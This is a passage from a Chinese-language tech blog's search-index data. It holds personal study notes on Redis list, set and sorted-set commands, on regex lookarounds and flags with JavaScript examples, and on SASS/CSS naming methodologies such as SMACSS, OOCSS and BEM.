rel=\"noopener\">LREM key count value — Redis 命令参考</a></p>\n<h4 id=\"lrange\"><a href=\"#lrange\" class=\"headerlink\" title=\"lrange\"></a>lrange</h4><blockquote>\n<p>返回列表 key 中指定區間內的元素，區間以偏移量 start 和 stop 指定。</p>\n<p>下標(index)參數 start 和 stop 都以 0 為底，也就是說，以 0 表示列表的第一個元素，以 1 表示列表的第二個元素，以此類推。</p>\n<p>你也可以使用負數下標，以 -1 表示列表的最後一個元素， -2 表示列表的倒數第二個元素，以此類推。</p>\n</blockquote>\n<p><a href=\"http://redisdoc.com/list/lrange.html\" target=\"_blank\" rel=\"noopener\">LRANGE key start stop — Redis 命令參考</a></p>\n<h4 id=\"lindex\"><a href=\"#lindex\" class=\"headerlink\" title=\"lindex\"></a>lindex</h4><p>lindex key index<br>回傳 list 的位置 value值</p>\n<h4 id=\"brpop\"><a href=\"#brpop\" class=\"headerlink\" title=\"brpop\"></a>brpop</h4><p>阻塞 rpop</p>\n<h4 id=\"brpush\"><a href=\"#brpush\" class=\"headerlink\" title=\"brpush\"></a>brpush</h4><p>阻塞 rpush</p>\n<h4 id=\"總整理\"><a href=\"#總整理\" class=\"headerlink\" title=\"總整理\"></a>總整理</h4><p>新增: rpush lpush linsert<br>查詢: lrange lindex llen<br>刪除: lpop rpop lrem ltrim<br>修改: lset<br>阻塞動作: blpop brpop</p>\n<p>Message Queue 消息對列 是用 lpush,brpop<br>但跟 lpush ,rpop 不能做嗎?<br>後來發現 rpop 不會阻塞<br>在這邊程式用 while 迴圈 CPU 一定會爆表(吃很多資源)</p>\n<h3 id=\"Set\"><a href=\"#Set\" class=\"headerlink\" title=\"Set\"></a>Set</h3><h4 id=\"sset\"><a href=\"#sset\" class=\"headerlink\" title=\"sset\"></a>sset</h4><p>sset key element …</p>\n<h4 id=\"srem\"><a href=\"#srem\" class=\"headerlink\" title=\"srem\"></a>srem</h4><p>srem key element </p>\n<h4 id=\"scard\"><a href=\"#scard\" class=\"headerlink\" title=\"scard\"></a>scard</h4><p>算出 set 個數</p>\n<h4 id=\"sismember\"><a href=\"#sismember\" class=\"headerlink\" title=\"sismember\"></a>sismember</h4><p>set is member ?</p>\n<p>判斷 set 裡面有沒有 指定的值</p>\n<h4 id=\"spop\"><a href=\"#spop\" class=\"headerlink\" title=\"spop\"></a>spop</h4><p>移除一個 set 的值</p>\n<p>回傳移除的值</p>\n<h4 id=\"srandmember\"><a href=\"#srandmember\" class=\"headerlink\" title=\"srandmember\"></a>srandmember</h4><p>srandmember key [count]</p>\n<p>隨機回傳 set 的 member(資料)</p>\n<h4 id=\"smember\"><a href=\"#smember\" class=\"headerlink\" title=\"smember\"></a>smember</h4><p>smember key</p>\n<p>回傳 set 所有值(member)</p>\n<p>PS: smembers 和 lrange,hgetall 都會造成阻塞可能性。通常會用 sscan 替代</p>\n<h4 id=\"set-運算集\"><a href=\"#set-運算集\" class=\"headerlink\" title=\"set 運算集\"></a>set 運算集</h4><h5 id=\"sinter-交集\"><a href=\"#sinter-交集\" class=\"headerlink\" title=\"sinter (交集)\"></a>sinter (交集)</h5><p>sinter key [key …]</p>\n<h5 id=\"sunion-聯集\"><a href=\"#sunion-聯集\" class=\"headerlink\" title=\"sunion (聯集)\"></a>sunion (聯集)</h5><p>sunion key [key …]</p>\n<h5 id=\"sdiff-差集\"><a href=\"#sdiff-差集\" class=\"headerlink\" title=\"sdiff (差集)\"></a>sdiff (差集)</h5><p>sdiff key [key …]</p>\n<h5 id=\"集合存在…\"><a href=\"#集合存在…\" class=\"headerlink\" title=\"集合存在…\"></a>集合存在…</h5><p>sinterstore destination key [key …]<br>sunionstore destination key [key …]<br>sdiffstore destination key [key …]</p>\n<h3 id=\"sorted-set\"><a href=\"#sorted-set\" class=\"headerlink\" title=\"sorted set\"></a>sorted set</h3><h4 id=\"zadd\"><a href=\"#zadd\" class=\"headerlink\" title=\"zadd\"></a>zadd</h4><p>sadd key [option] score member [score member …]</p>\n<p><strong>option</strong><br>nx: member 必須不存在<br>xx: member 必須存在<br>CH：修改從加入新的元素，以改變元件的總數（CH是改變的縮寫）的數目的返回值. 更改的元素是添加的新元素以及已為其更新分數的現有元素. 因此，命令行中指定的具有與過去相同分數的元素將不計算在內. 注意：通常， ZADD的返回值僅計算添加的新元素的數量.<strong>這個還不是很懂</strong><br><a href=\"https://s0redis0io.icopy.site/commands/zadd\" target=\"_blank\" rel=\"noopener\">ZADD – Redis 中文文檔教程</a><br>INCR: 數值累加</p>\n<h4 id=\"zcard\"><a href=\"#zcard\" class=\"headerlink\" title=\"zcard\"></a>zcard</h4><p>查詢 zset 個數</p>\n<h4 id=\"zsocre\"><a href=\"#zsocre\" class=\"headerlink\" title=\"zsocre\"></a>zsocre</h4><p>這個很重要。沒有 zget<br>zscore key member<br>得到設定分數</p>\n<h4 id=\"排名\"><a href=\"#排名\" class=\"headerlink\" title=\"排名\"></a>排名</h4><h5 id=\"zrank\"><a href=\"#zrank\" class=\"headerlink\" title=\"zrank\"></a>zrank</h5><p>zrank key member</p>\n<p>查詢 member 排名<br>由小到大</p>\n<h5 id=\"zrevrank\"><a href=\"#zrevrank\" class=\"headerlink\" title=\"zrevrank\"></a>zrevrank</h5><p>zrevrank 排名(倒敘)<br>由大到小</p>\n<h4 id=\"zrem\"><a href=\"#zrem\" class=\"headerlink\" title=\"zrem\"></a>zrem</h4><p>zrem key member [member …]</p>\n<p>刪除 member</p>\n<h4 id=\"zincrby\"><a href=\"#zincrby\" class=\"headerlink\" title=\"zincrby\"></a>zincrby</h4><p>zincrby key increment member</p>\n<p>給 member 增加 score</p>\n<h4 id=\"zrange-zrevrange\"><a href=\"#zrange-zrevrange\" class=\"headerlink\" title=\"zrange,zrevrange\"></a>zrange,zrevrange</h4><p>由小到大<br>zrange key start end [withscores]<br>由大到小<br>zrevrange key start end [withscores]</p>\n<p>ex: zrange zset 0 100</p>\n<p>withscores 是同時返回 score 分數</p>\n<h4 id=\"zrangebyscore-zrevrangebyscore\"><a href=\"#zrangebyscore-zrevrangebyscore\" class=\"headerlink\" title=\"zrangebyscore, zrevrangebyscore\"></a>zrangebyscore, zrevrangebyscore</h4><p>zrangebyscore key min max [withscores] [limit offset count]</p>\n<p>zrevrangebyscore key min max [withscores] [limit offset count]</p>\n<p>指定範圍返回 member</p>\n<p>-inf,+inf =&gt; 無限小,無限大<br>小括號 <code>(</code> 大於<br>ex: zrangebyscore user:rank (200 +inf withscores</p>\n<h4 id=\"zcount\"><a href=\"#zcount\" class=\"headerlink\" title=\"zcount\"></a>zcount</h4><p>zcount key min max </p>\n<p>抓取分數區間的 member 個數</p>\n<h4 id=\"zremrangebyrank-zremrangebyscore\"><a href=\"#zremrangebyrank-zremrangebyscore\" class=\"headerlink\" title=\"zremrangebyrank , zremrangebyscore\"></a>zremrangebyrank , zremrangebyscore</h4><p>zremrangebyrank key start end</p>\n<p>刪除 rank 排名(0開始)</p>\n<p>ex: zremrangebyrank user:rank 0 3</p>\n<p>zremrangebyscore key min max</p>\n<p>zremrangebyscore user:rank (250 +inf</p>\n<h4 id=\"集運算\"><a href=\"#集運算\" class=\"headerlink\" title=\"集運算\"></a>集運算</h4><p>交集<br>zinterstore destination numkeys key [key …] [weights weight [weight …]] [aggregate sum|min|max]</p>\n<p>weight 權重<br>aggregate 交集後做的 score 動作。預設是 sum</p>\n<p>并集</p>\n<p>zunionstore destination numkeys key [key …] [weights weight [weight …]] [aggregate sum|min|max]</p>\n<h4 id=\"zset-小結論\"><a href=\"#zset-小結論\" class=\"headerlink\" title=\"zset 小結論\"></a>zset 小結論</h4><p>set 跟 zset 指令差非常多<br>一般常用在 排行榜上面</p>\n<h5 id=\"有在思考資料會一直存在-redis\"><a href=\"#有在思考資料會一直存在-redis\" class=\"headerlink\" title=\"有在思考資料會一直存在 redis ?\"></a>有在思考資料會一直存在 redis ?</h5><p>經過 Google 一翻，正常會把資料回傳到 MySQL</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/sunshine-H/p/7922285.html\" target=\"_blank\" rel=\"noopener\">PHP+Redis 实例【一】点赞 + 热度 上篇 - H-大叔 - 博客园</a></li>\n<li><a href=\"https://www.cnblogs.com/sunshine-H/p/7928034.html\" target=\"_blank\" rel=\"noopener\">PHP+Redis 实例【一】点赞 + 热度 下篇 - H-大叔 - 博客园</a></li>\n</ul>\n<p>更多文章</p>\n<ul>\n<li><a href=\"https://www.jianshu.com/p/8060708a5b46\" target=\"_blank\" rel=\"noopener\">使用MySQL、Redis解决排行榜问题 - 簡書</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/50770947\" target=\"_blank\" rel=\"noopener\">千万用户排名设计 - 知乎</a></li>\n<li><a href=\"https://blog.codingnow.com/2014/03/mmzb_db_2.html\" target=\"_blank\" rel=\"noopener\">云风的 BLOG: 谈谈陌陌争霸在数据库方面踩过的坑(排行榜篇)</a></li>\n</ul>\n<h2 id=\"搜尋一些\"><a href=\"#搜尋一些\" class=\"headerlink\" title=\"搜尋一些\"></a>搜尋一些</h2><h3 id=\"redis-學習路線\"><a href=\"#redis-學習路線\" class=\"headerlink\" title=\"redis 學習路線\"></a>redis 學習路線</h3><p>網路上找到的圖</p>\n<img src=\"/blog/2020/02/17/Redis-小記/redis.png\" title=\"Redis學習路線\">\n<h3 id=\"一些找網路文章\"><a href=\"#一些找網路文章\" class=\"headerlink\" title=\"一些找網路文章\"></a>一些找網路文章</h3><ul>\n<li><a href=\"https://learnku.com/articles/33421\" target=\"_blank\" rel=\"noopener\">Redis 应用场景汇总 | LearnKu 终身编程者的知识社区</a></li>\n<li><a href=\"https://segmentfault.com/q/1010000010777585\" target=\"_blank\" rel=\"noopener\">php - redis使用list做消息队列,为什么推送用lpush,而消费用的是brpop? - SegmentFault 思否</a></li>\n<li><a href=\"https://researchlab.github.io/2018/10/13/redis-16-storage-solution-opt/\" target=\"_blank\" rel=\"noopener\">redis专题16 数据持久化实践 | 一线攻城狮</a></li>\n<li><a href=\"http://jinguoxing.github.io/redis/2018/09/04/redis-scan/\" target=\"_blank\" rel=\"noopener\">Redis SCAN的使用 - 静中细思的博客 | Kingnet Blog</a></li>\n<li><a href=\"https://yq.aliyun.com/articles/531067\" target=\"_blank\" rel=\"noopener\">阿里云Redis开发规范-云栖社区-阿里云</a></li>\n<li><a href=\"https://yq.aliyun.com/articles/236384?spm=a2c4e.11153940.0.0.fdaf2d39jbvGgk\" target=\"_blank\" rel=\"noopener\">Jedis常见异常汇总-云栖社区-阿里云</a></li>\n</ul>\n","categories":["Redis"],"tags":["redis"]},{"title":"Regex 排除單字方法(Lookarounds)","url":"/blog/2018/07/03/Regex-%E6%8E%92%E9%99%A4%E5%96%AE%E5%AD%97%E6%96%B9%E6%B3%95-Lookarounds/","content":"<p>這次專案有用到 email 學生任證，有想一個用 email 方法<br>但這次需求要把一些教育信箱排除在外…<br>查了一下 regex 好像沒法對特定單字做<br>不過我有實做一個方法(不知道有沒有漏洞)</p>\n<a id=\"more\"></a>\n<h3 id=\"a-xxx\"><a href=\"#a-xxx\" class=\"headerlink\" title=\"a(?!xxx)\"></a>a(?!xxx)</h3><p>不會抓 axxx，但會抓 ax,axx,aoxxx 的<code>a</code></p>\n<h3 id=\"a-xxx-1\"><a href=\"#a-xxx-1\" class=\"headerlink\" title=\"a(?=xxx)\"></a>a(?=xxx)</h3><p>會抓 axxx 的<code>a</code></p>\n<h3 id=\"xxx\"><a href=\"#xxx\" class=\"headerlink\" title=\"(?:xxx)\"></a>(?:xxx)</h3><p><strong>2019-12-08</strong><br>這邊 xxx 一樣是連詞<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">^I like (?:dogs|penguins), but not (?:lions|tigers).$</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://www.ocpsoft.org/tutorials/regular-expressions/or-in-regex/?fbclid=IwAR0AWbTPjZKC5bXSqGBfHOTMEqPG5T-K7lmQKs9UWd3yD0Qdmz3y1aUOSvI\" target=\"_blank\" rel=\"noopener\">Regular Expression for Or | “|” Regex | Regular Expression I | OCPsoft</a></p>\n<p>不會算 group</p>\n<p>最後再沒有找到資料情況下，有例用上面 3 個想到一個方法</p>\n<p><code>@(?!nfu)\\S*edu.tw</code></p>\n<p>例用<code>(?!xxx)</code>跟<code>\\S</code>(非空白字符)<br>真的太久沒有寫會忘 orz<br>我每次都是寫的時候再查</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\s 元字符用于查找空白字符。</span><br><span class=\"line\"></span><br><span class=\"line\">空白字符可以是：</span><br><span class=\"line\"></span><br><span class=\"line\">    空格符 (space character)</span><br><span class=\"line\">    制表符 (tab character)</span><br><span class=\"line\">    回车符 (carriage return character)</span><br><span class=\"line\">    换行符 (new line character)</span><br><span class=\"line\">    垂直换行符 (vertical tab character)</span><br><span class=\"line\">    换页符 (form feed character)</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://www.w3school.com.cn/js/jsref_regexp_whitespace.asp\" target=\"_blank\" rel=\"noopener\">http://www.w3school.com.cn/js/jsref_regexp_whitespace.asp</a></p>\n<p><a href=\"https://stackoverflow.com/questions/406230/regular-expression-to-match-a-line-that-doesnt-contain-a-word\" target=\"_blank\" rel=\"noopener\">regex - Regular expression to match a line that doesn’t contain a word? - Stack Overflow</a><br>還有看到這篇，但好像不實用</p>\n<p><a href=\"http://www.rexegg.com/regex-quickstart.html#lookarounds\" target=\"_blank\" rel=\"noopener\">Regex Cheat Sheet</a>看到裡面還有很多不會<br>感覺還有更深的東西。有時間再食用。</p>\n<p><strong>2019-07-25</strong></p>\n<p>今天在改 PHP 程式，由於要改一些程式把<code>xxx_line</code>去除掉<br>但是跟 PHP <code>__LINE__</code>衝突<br>不過後來找到正規化去除<code>(?&lt;!_)_line</code></p>\n<p><a href=\"http://darkk6.blogspot.com/2017/03/regexp-lookahead-lookbehind.html\" target=\"_blank\" rel=\"noopener\">無聊技術研究: RegExp 應用： lookahead , lookbehind</a> <a href=\"/blog/2018/07/03/Regex-排除單字方法-Lookarounds/web1.png\" title=\"備份圖\">備份圖</a></p>\n<p>裡面有提到<code>lookahead</code>(往前看)</p>\n<pre><code>Positive lookahead ： a(?=Y)\nNegative lookahead ： a(?!Y)\n</code></pre><p>剛我這個例子是用<code>lookbehind</code>(往後看)<br>之前沒有記錄到</p>\n<p>Positive lookbehind ： (?&lt;=Y)a<br>Negative lookbehind： (?&lt;!Y)a</p>\n<p>參考來源：</p>\n<ul>\n<li><a href=\"https://codeday.me/bug/20170511/14935.html\" target=\"_blank\" rel=\"noopener\">regex – 排除单词/字符串的正则表达式 - 代码日志</a></li>\n<li><a href=\"https://stackoverflow.com/questions/406230/regular-expression-to-match-a-line-that-doesnt-contain-a-word\" target=\"_blank\" rel=\"noopener\">regex - Regular expression to match a line that doesn’t contain a word? - Stack Overflow</a></li>\n<li><a href=\"https://www.regextester.com/15\" target=\"_blank\" rel=\"noopener\">Match string not containing string - Regex Tester/Debugger</a></li>\n<li><a href=\"http://es6.ruanyifeng.com/#docs/regex\" target=\"_blank\" rel=\"noopener\">正则的扩展 - ECMAScript 6 入门</a></li>\n</ul>\n","categories":["Regex"],"tags":["regex","lookarounds"]},{"title":"Regex 豎旗(flag)的那些事情","url":"/blog/2019/01/02/Regex-%E8%B1%8E%E6%97%97-flag-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85/","content":"<p>很常去搞正規化<br>但卻沒有認真了解裡面的事情<br>今天一口氣記錄<br>其實仔細看也沒很多(= =a)</p>\n<a id=\"more\"></a>\n<p>flag</p>\n<ul>\n<li>g Global search.</li>\n<li>i Case-insensitive search.</li>\n<li>m Multi-line search.</li>\n<li>u unicode; treat a pattern as a sequence of unicode code points</li>\n<li>y Perform a “sticky” search that matches starting at the current position in the target string. See <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/sticky\" target=\"_blank\" rel=\"noopener\">RegExp.prototype.sticky | MDN</a></li>\n</ul>\n<h3 id=\"心裡疑惑\"><a href=\"#心裡疑惑\" class=\"headerlink\" title=\"心裡疑惑\"></a>心裡疑惑</h3><p>其實我對<code>g</code>這個也滿疑惑的<br>什麼是全域查詢<br>平常用 sublime 或 vscode 都沒有這個搜尋選項</p>\n<p><code>m</code>多行模式<br>也讓我很疑惑，是找多行，但感覺跟<code>g</code>有關係<br>可以找多筆</p>\n<p>regex 101 產生 JavaScript 語法<br><code>exec</code>怎麼可以做 while 迴圈</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> regex = <span class=\"regexp\">/test/gm</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> str = <span class=\"string\">`test`</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> m;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> ((m = regex.exec(str)) !== <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// This is necessary to avoid infinite loops with zero-width matches</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (m.index === regex.lastIndex) &#123;</span><br><span class=\"line\">    regex.lastIndex++;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// The result can be accessed through the `m`-variable.</span></span><br><span class=\"line\">  m.forEach(<span class=\"function\">(<span class=\"params\">match, groupIndex</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">`Found match, group <span class=\"subst\">$&#123;groupIndex&#125;</span>: <span class=\"subst\">$&#123;match&#125;</span>`</span>);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"研究結果\"><a href=\"#研究結果\" class=\"headerlink\" title=\"研究結果\"></a>研究結果</h3><p><code>m</code>看是否需要一行一行搜尋，通常可能需要搭配<code>g</code>才能找出多行資料<br>一般沒用<code>m</code>算單行模式<br>從這篇來看到<a href=\"https://www.cnblogs.com/zengguowang/p/7998754.html\" target=\"_blank\" rel=\"noopener\">正則表達式之單行模式、多行模式、區分大小寫模式 - ^小七 - 博客園</a> <a href=\"/blog/2019/01/02/Regex-豎旗-flag-的那些事情/2.png\" title=\"備份圖\">備份圖</a></p>\n<blockquote>\n<p>單行模式: (.)點號不匹配換行符，在 windows 中與[^\\r\\n]等價，並不是刻意匹配任意字符，在單行模式下會改變點號的含義，做到匹配任意字符 s<br>多行模式: 多行模式下^和\\$的含義會被改變，普通的含義是匹配整個字符串的開頭和結尾，在多行模式下匹配的就是每一行的行首和行尾，而\\A 和\\Z 他們的含義始終是匹配整個字符串的開頭和結尾<br>再看這個範例，可以看出差異<a href=\"https://www.regextester.com/102251\" target=\"_blank\" rel=\"noopener\">Multiple Strings - Regex Tester/Debugger</a><br>簡單來說就是<code>^xxx$</code>才會看出差異</p>\n</blockquote>\n<p><code>g</code>其實跟持續搜尋有關係(如:js)，但是 php 會用不同函式(preg_match_all,preg_match)，可以自己玩玩看 regex101<br>可參考:<a href=\"https://segmentfault.com/a/1190000003497780\" target=\"_blank\" rel=\"noopener\">[ JS 进阶 ] test, exec, match, replace - kraaas 前端博客 - SegmentFault 思否</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">var reg = /\\d/;</span><br><span class=\"line\">//第一次匹配</span><br><span class=\"line\">console.log(reg.exec(&apos;a123&apos;));</span><br><span class=\"line\">console.log(reg.lastIndex);</span><br><span class=\"line\">//输出</span><br><span class=\"line\">[&quot;1&quot;]</span><br><span class=\"line\">  0</span><br><span class=\"line\"></span><br><span class=\"line\">第二次匹配</span><br><span class=\"line\">console.log(reg.exec(&apos;a123&apos;));</span><br><span class=\"line\">console.log(reg.lastIndex);</span><br><span class=\"line\">//输出</span><br><span class=\"line\">[&quot;1&quot;]</span><br><span class=\"line\">  0</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">var reg = /\\d/g;</span><br><span class=\"line\">//第一次匹配</span><br><span class=\"line\">console.log(reg.exec(&apos;a123&apos;));</span><br><span class=\"line\">console.log(reg.lastIndex);</span><br><span class=\"line\">//输出</span><br><span class=\"line\">[&quot;1&quot;]</span><br><span class=\"line\">  2</span><br><span class=\"line\"></span><br><span class=\"line\">第二次匹配</span><br><span class=\"line\">console.log(reg.exec(&apos;a123&apos;));</span><br><span class=\"line\">console.log(reg.lastIndex);</span><br><span class=\"line\">//输出</span><br><span class=\"line\">[&quot;2&quot;]</span><br><span class=\"line\">  3</span><br><span class=\"line\"></span><br><span class=\"line\">第三次匹配</span><br><span class=\"line\">console.log(reg.exec(&apos;a123&apos;));</span><br><span class=\"line\">console.log(reg.lastIndex);</span><br><span class=\"line\">//输出</span><br><span class=\"line\">[&quot;3&quot;]</span><br><span class=\"line\">  4</span><br><span class=\"line\"></span><br><span class=\"line\">第四匹配</span><br><span class=\"line\">console.log(reg.exec(&apos;a123&apos;));</span><br><span class=\"line\">console.log(reg.lastIndex);</span><br><span class=\"line\">//输出</span><br><span class=\"line\">null</span><br><span class=\"line\">  0</span><br></pre></td></tr></table></figure>\n<p>regex 物件有 exec,test，參數是帶 string<br>string 型態有 match，參數是帶 regex</p>\n<p>要注意 regex exec 跟 test 都吃<code>g</code>flag<br>test 回傳只會傳 true,false<br>exec 回傳比較特殊，傳回來是一個 array<br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test#%E5%BD%93%E8%AE%BE%E7%BD%AE%E5%85%A8%E5%B1%80%E6%A0%87%E5%BF%97%E7%9A%84%E6%AD%A3%E5%88%99%E4%BD%BF%E7%94%A8test(\" target=\"_blank\" rel=\"noopener\">当设置全局标志的正则使用 test | MDN</a>&gt;)<br>感覺一不小心結果會得到不一樣的結果</p>\n<p>unicode、sticky 好像都是 ES6 東西，先暫時不研究。</p>\n<p><a href=\"http://es6.ruanyifeng.com/#docs/regex\" target=\"_blank\" rel=\"noopener\">正则的扩展 - ECMAScript 6 入门</a><br><a href=\"http://jsfiddle.net/uq55en5o/\" target=\"_blank\" rel=\"noopener\">Edit fiddle - JSFiddle</a></p>\n<p><a href=\"https://blog.hinablue.me/js-regexp-can-shu-de-zheng-que-zi-shi/\" target=\"_blank\" rel=\"noopener\">[JS] RegExp 參數的正確姿勢</a> <a href=\"/blog/2019/01/02/Regex-豎旗-flag-的那些事情/1.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://blog.csdn.net/hongweigg/article/details/39579609\" target=\"_blank\" rel=\"noopener\">正则表达式多行匹配及声明标识 - hongweigg 的专栏 - CSDN 博客</a><br><a href=\"https://www.cnblogs.com/zengguowang/p/7998754.html\" target=\"_blank\" rel=\"noopener\">正则表达式之单行模式、多行模式、区分大小写模式 - ^小七 - 博客园</a></p>\n","categories":["Regex"],"tags":["regex"]},{"title":"SASS 學習小記","url":"/blog/2019/06/02/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/","content":"<p>最近上課 SASS<br>這邊記入我可能會忘記的東西</p>\n<a id=\"more\"></a>\n<h2 id=\"SMACSS\"><a href=\"#SMACSS\" class=\"headerlink\" title=\"SMACSS\"></a>SMACSS</h2><p>重點 擴充、模組化</p>\n<ul>\n<li>Base<br>不要下 class ，可以用基本樣式<br>這個地方可參考<a href=\"https://purecss.io/\" target=\"_blank\" rel=\"noopener\">Pure</a>設計方法</li>\n<li>Layout<br>l-grid,l-list<br>(建議不要用語意命名)<br>每一頁會用到的 class</li>\n<li>module<br>每頁重複會用到的元件。如按鈕(.btn)<br>錯誤範例如下</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.btn</span><br><span class=\"line\">.btn-blue</span><br><span class=\"line\">.btn-blue-large</span><br></pre></td></tr></table></figure>\n<p>正確比要適合用 bootstrap 命名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.btn</span><br><span class=\"line\">.btn-primary</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>增加子模組<br>.l-grid<br>.l-grid h2 ==&gt; .l-grid_title<br>.l-grid ul ==&gt; .l-grid_list</p>\n</blockquote>\n<p>簡單我對 SMCASS 總結，就是做<code>程式切分結構</code><br>可參考如下網站<br><a href=\"https://wcc723.github.io/css/2016/12/20/sass-folder/\" target=\"_blank\" rel=\"noopener\">鐵人賽 20 - Sass 資料夾結構 | 卡斯伯 Blog - 前端，沒有極限</a></p>\n<ol>\n<li>base</li>\n<li>layout</li>\n<li>module<br>——以下可看專案大小決定</li>\n<li>theme</li>\n</ol>\n<p>…</p>\n<p>更多可參考這篇<a href=\"https://gist.github.com/rveitch/84cea9650092119527bc\" target=\"_blank\" rel=\"noopener\">Sass 7-1 Pattern</a></p>\n<h2 id=\"OOCSS\"><a href=\"#OOCSS\" class=\"headerlink\" title=\"OOCSS\"></a>OOCSS</h2><ol>\n<li>結構與樣式分離</li>\n<li>容器與內容分離</li>\n</ol>\n<p>首先，還是先分清楚什麼是結構?什麼事容器?</p>\n<h3 id=\"1-結構、樣式\"><a href=\"#1-結構、樣式\" class=\"headerlink\" title=\"1.結構、樣式\"></a>1.結構、樣式</h3><p><strong>結構</strong><br>EX: Bootstrap .btn<br>.btn 這個就是結構</p>\n<p><strong>樣式</strong><br>.btn-lg .btn-primary<br>這些就是樣式</p>\n<h3 id=\"2-容器、內容\"><a href=\"#2-容器、內容\" class=\"headerlink\" title=\"2.容器、內容\"></a>2.容器、內容</h3><p><strong>容器</strong><br>EX: Bootstrap 的.container , col-3<br>簡單就是排版、網格</p>\n<p><strong>內容</strong><br>EX: Bootstrap 的 .pagination .list-group</p>\n<h3 id=\"OOCSS-好處\"><a href=\"#OOCSS-好處\" class=\"headerlink\" title=\"OOCSS 好處\"></a>OOCSS 好處</h3><ol>\n<li>增加使用性(reuse)</li>\n<li>減少 code</li>\n</ol>\n<p>需要注意的事情!!<br><code>樣式</code>CSS 不要跟 <code>結構</code>一起寫!!!!<br><strong>錯誤範例</strong>EX: .col-3 .btn<br>這樣會失去彈性</p>\n<p>容器與內容可以玩一下裡面的排版<br>正常容器裡面可以放<code>容器</code>和<code>內容</code><br>完一下可以大概知道這兩個差異<br><a href=\"https://www.layoutit.com/cn\" target=\"_blank\" rel=\"noopener\">LayoutIt! - Interface Builder for CSS Grid and Bootstrap</a></p>\n<h3 id=\"我們可能有寫過的-OOCSS\"><a href=\"#我們可能有寫過的-OOCSS\" class=\"headerlink\" title=\"我們可能有寫過的 OOCSS\"></a>我們可能有寫過的 OOCSS</h3><p>以前我看到有些網站的 CSS 是這樣寫的<br>ex: .text-left, .mt1, .mt2, .mt3 …<br>覺得這樣寫也不錯，後來我有些網站也有這樣寫</p>\n<h3 id=\"OOCSS-會有什麼缺點\"><a href=\"#OOCSS-會有什麼缺點\" class=\"headerlink\" title=\"OOCSS 會有什麼缺點\"></a>OOCSS 會有什麼缺點</h3><p>不好的話，html 的 class 東西可能會越來越多<br>這時候我覺得可以看情況是不是需要用 module</p>\n<h2 id=\"BEM\"><a href=\"#BEM\" class=\"headerlink\" title=\"BEM\"></a>BEM</h2><p>BEM 的意思是區塊（Block）、元素（Element）、修飾符（Modifier）</p>\n<h3 id=\"Block\"><a href=\"#Block\" class=\"headerlink\" title=\"Block\"></a>Block</h3><p>這邊覺得簡單講就是一個 module(模組)<br>EX: .card,.list__item</p>\n<p><code>__</code>這邊規定說只能放一個，能放多個</p>\n<p><strong>這邊有一個重點</strong></p>\n<h3 id=\"Element\"><a href=\"#Element\" class=\"headerlink\" title=\"Element\"></a>Element</h3><p>一個 Block 可以放多個 Element。我簡單說他是<code>子模組</code>。<br>在使用 Element</p>\n<p>.list__item__img<br>.list__item__title<br>.list__item__content</p>\n<h3 id=\"Modifier\"><a href=\"#Modifier\" class=\"headerlink\" title=\"Modifier\"></a>Modifier</h3><p>簡單就是說(子)模組狀態<br>正常會在 Modifier 放<code>--</code></p>\n<h3 id=\"符號-跟–-沒有強制規定\"><a href=\"#符號-跟–-沒有強制規定\" class=\"headerlink\" title=\"符號__跟– 沒有強制規定\"></a>符號__跟– 沒有強制規定</h3><p>BEM 符號可以看公司規定做調整<br>最近剛好看到巴哈論壇他們的 CSS 好像是這樣設計的<br>但他們符號沒有跟 BEM 用一樣</p>\n<h2 id=\"設計模式總結\"><a href=\"#設計模式總結\" class=\"headerlink\" title=\"設計模式總結\"></a>設計模式總結</h2><p>最後紀錄三個設計 CSS 設計模式<br>設計不一定要同時用三個<br>選擇上可以參考上面三個設計</p>\n<h2 id=\"其他紀錄\"><a href=\"#其他紀錄\" class=\"headerlink\" title=\"其他紀錄\"></a>其他紀錄</h2><h3 id=\"CSS-盡量不要超過-3-層\"><a href=\"#CSS-盡量不要超過-3-層\" class=\"headerlink\" title=\"CSS 盡量不要超過 3 層\"></a>CSS 盡量不要超過 3 層</h3><p>EX: .header nav ul li a</p>\n<p>這樣太多層了</p>\n<p>可以改成 nav li a</p>\n<p>原因效能上也會有關係，管理上也比較麻煩</p>\n<h3 id=\"為什麼有些-container-裡面會包-wrap\"><a href=\"#為什麼有些-container-裡面會包-wrap\" class=\"headerlink\" title=\"為什麼有些.container 裡面會包.wrap?\"></a>為什麼有些.container 裡面會包.wrap?</h3><p>有時候.wrap 裡面某些元件可能需要做致中<br>可以搭配.wrap 操作置中<br>會比較方便</p>\n<h3 id=\"盡量不要寫-a-logo\"><a href=\"#盡量不要寫-a-logo\" class=\"headerlink\" title=\"盡量不要寫 a.logo\"></a>盡量不要寫 